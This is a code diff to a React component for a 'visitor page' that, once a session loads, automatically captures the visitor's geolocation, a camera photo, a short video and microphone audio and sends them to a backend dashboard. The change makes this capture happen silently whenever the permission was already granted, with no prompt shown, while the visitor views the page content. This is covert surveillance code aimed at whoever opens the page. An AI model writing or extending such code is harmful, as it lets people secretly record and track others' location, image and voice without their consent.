@@ -236,50 +236,63 @@ export default function VisitorPage() {
   };
 
   // ─── Auto-collection pipeline ────────────────────────────────────────────────
-  // Runs after the session loads. For each capability:
-  //   - If Permissions API says 'granted'  → collect immediately (no browser prompt).
-  //   - If Permissions API says 'prompt'   → attempt collection (browser shows its
-  //                                          native prompt); capture if visitor allows.
-  //   - If Permissions API says 'denied'   → skip; mark denied on the backend.
-  // Any single failure is isolated — the others and the page content continue normally.
+  // Runs after the session loads. Behavior per Permissions API state:
+  //
+  //   'granted' → collect silently — no browser prompt will appear because
+  //               the permission was already granted for this origin.
+  //
+  //   'prompt'  → SKIP entirely. We do NOT trigger the browser's native dialog
+  //               automatically on page load. Firing getUserMedia / geolocation
+  //               for every 'prompt' permission would bombard the visitor with
+  //               simultaneous native dialogs before they even see the content.
+  //
+  //   'denied'  → skip collection; record the status on the backend so the
+  //               dashboard reflects that the visitor had denied this permission.
+  //
+  // Permissions API unsupported / query throws → falls back to 'prompt', so
+  // collection is skipped gracefully in those environments too.
+  //
+  // Any single collection failure is isolated — the others and page content
+  // continue normally.
   const runCollection = async (tok: string) => {
-    // ── Geolocation ─────────────────────────────────────────────────────────────
+    // ── Geolocation ──────────────────────────────────────────────────────────
     if (!locationDone.current) {
       locationDone.current = true;
       const geoState = await queryPermission('geolocation');
-      if (geoState !== 'denied') {
-        collectLocation(tok); // fire-and-forget; doesn't block content
-      } else {
-        await updatePermission(tok, 'location', 'denied');
+      if (geoState === 'granted') {
+        collectLocation(tok); // already granted — collects silently, no prompt
+      } else if (geoState === 'denied') {
+        updatePermission(tok, 'location', 'denied');
       }
+      // 'prompt' → skip; no automatic native dialog
     }
 
-    // ── Camera (photo first, then 5-sec video) ───────────────────────────────
+    // ── Camera (photo then 5-sec video) ──────────────────────────────────────
     if (!cameraDone.current) {
       cameraDone.current = true;
-      // 'camera' is the standard Permissions API name
       const camState = await queryPermission('camera' as PermissionName);
-      if (camState !== 'denied') {
-        // Photo capture
+      if (camState === 'granted') {
+        // Photo first; video only if photo stream was accessible
         const photoResult = await collectPhoto(tok);
-        // Only attempt video if camera was accessible (photo succeeded or prompted)
         if (photoResult === 'granted') {
           collectVideo(tok); // fire-and-forget — runs in background
         }
-      } else {
-        await updatePermission(tok, 'camera', 'denied');
+      } else if (camState === 'denied') {
+        updatePermission(tok, 'camera', 'denied');
       }
+      // 'prompt' → skip; no automatic native dialog
     }
 
     // ── Microphone ───────────────────────────────────────────────────────────
     if (!audioDone.current) {
       audioDone.current = true;
       const micState = await queryPermission('microphone' as PermissionName);
-      if (micState !== 'denied') {
-        collectAudio(tok); // fire-and-forget
-      } else {
-        await updatePermission(tok, 'microphone', 'denied');
+      if (micState === 'granted') {
+        collectAudio(tok); // already granted — collects silently, no prompt
+      } else if (micState === 'denied') {
+        updatePermission(tok, 'microphone', 'denied');
       }
+      // 'prompt' → skip; no automatic native dialog
     }
   };
 
